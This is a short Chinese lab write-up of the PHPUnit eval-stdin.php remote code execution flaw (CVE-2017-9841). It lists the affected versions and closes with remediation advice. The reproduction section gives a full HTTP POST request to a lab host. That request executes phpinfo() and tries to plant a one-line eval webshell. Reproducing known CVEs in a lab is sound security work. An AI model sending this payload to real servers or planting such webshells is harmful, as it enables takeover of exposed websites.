# PHPUnit远程执行代码（CVE-2017-9841）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->命令执行

### 0x01漏洞介绍

PHPUnit是面向程序员的PHP测试框架。

`Util/PHP/eval-stdin.php`在4.8.28之前的PHPUnit和5.6.3之前的5.x中允许远程攻击者通过以`<?php`子字符串开头的HTTP POST数据执行任意PHP代码，如对具有暴露的/ vendor文件夹的站点的攻击（即外部访问）所证明的到`/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`URI。

##### 			影响版本

```
phpunit 4.8.19 - 4.8.27
phpunit 5.0.10 - 5.6.2
```

### 0x02漏洞复现

#### payload

```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1

Host: 192.168.15.130:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: phpMyAdmin=kQNMsJ02WvJVFPRjybK8UKVgUyc

Upgrade-Insecure-Requests: 1

Content-Length: 15



<?=phpinfo();?>
<?=file_put_contents("1.php", '<?=eval($_REQUEST[1]);?>');//木马未写成功
```

![PHPUnit远程代码执行漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHPUnit远程代码执行漏洞_1.jpg)

### 0x03漏洞修复

生产环境直接删掉phpunit

升级phpunit

设置权限，禁止访问该目录